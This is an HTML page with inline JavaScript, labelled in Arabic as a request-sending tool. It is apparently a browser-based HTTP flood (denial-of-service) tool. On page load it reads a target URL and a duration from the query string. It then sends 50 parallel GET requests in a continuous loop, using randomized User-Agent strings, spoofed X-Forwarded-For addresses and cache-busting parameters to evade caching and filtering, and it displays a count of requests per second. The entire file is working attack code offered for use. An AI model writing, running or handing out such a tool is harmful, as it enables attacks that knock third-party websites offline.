<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أداة إرسال طلبات</title>
    <script>
        function getQueryParams() {
            const params = new URLSearchParams(window.location.search);
            return {
                url: params.get('url') || '',
                time: parseInt(params.get('time')) || 10
            };
        }

        let totalRequests = 0;
        let requestsPerSecond = 0;
        let intervalId;
        let isRunning = false;

        function getRandomIP() {
            return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        }

        async function sendRequest(targetUrl) {
            if (!isRunning) return;

            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 1000); // وقت انتهاء 1 ثانية

            try {
                const headers = {
                    'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 20) + 80}.0.${Math.floor(Math.random() * 4000)}.${Math.floor(Math.random() * 200)} Safari/537.36`,
                    'X-Forwarded-For': getRandomIP(),
                    'Accept': '*/*',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                };

                const response = await fetch(targetUrl + `?cachebust=${Math.random().toString(36).slice(2)}`, {
                    method: 'GET',
                    headers: headers,
                    mode: 'cors', // تغيير إلى cors لضمان وصول الطلبات
                    cache: 'no-store',
                    referrerPolicy: 'no-referrer',
                    signal: controller.signal
                });

                if (response.ok || response.type === 'basic') {
                    totalRequests++;
                    requestsPerSecond++;
                }
            } catch (e) {
                // تجاهل الأخطاء غير الحرجة فقط
                if (e.name !== 'AbortError') {
                    console.log('خطأ:', e.message); // اختياري للتصحيح
                }
            } finally {
                clearTimeout(timeout);
            }
        }

        function startSending(targetUrl, durationSeconds) {
            if (!targetUrl) {
                document.body.textContent = 'خطأ: يرجى تحديد رابط الهدف عبر بارامتر url';
                return;
            }

            isRunning = true;
            const startTime = Date.now();
            const endTime = startTime + (durationSeconds * 1000);

            intervalId = setInterval(() => {
                document.body.textContent = `rps ${requestsPerSecond} total ${totalRequests}`;
                requestsPerSecond = 0;
            }, 1000);

            function sendLoop() {
                if (!isRunning || Date.now() >= endTime) {
                    stopSending();
                    return;
                }

                const parallelRequests = 50; // زيادة العدد للسرعة
                const promises = [];
                for (let i = 0; i < parallelRequests; i++) {
                    promises.push(sendRequest(targetUrl));
                }

                Promise.allSettled(promises).then(() => setTimeout(sendLoop, 0));
            }

            sendLoop();
        }

        function stopSending() {
            isRunning = false;
            clearInterval(intervalId);
            document.body.textContent = `تم الانتهاء | rps ${requestsPerSecond} total ${totalRequests}`;
        }

        window.onload = function() {
            document.body.style.margin = '0';
            document.body.style.padding = '0';
            document.body.style.fontFamily = 'monospace';
            document.body.style.fontSize = '24px';
            document.body.style.textAlign = 'center';
            document.body.style.paddingTop = '50px';
            document.body.style.backgroundColor = 'white';
            document.body.style.color = 'black';

            const params = getQueryParams();
            startSending(params.url, params.time);
        };
    </script>
</head>
<body></body>
</html>
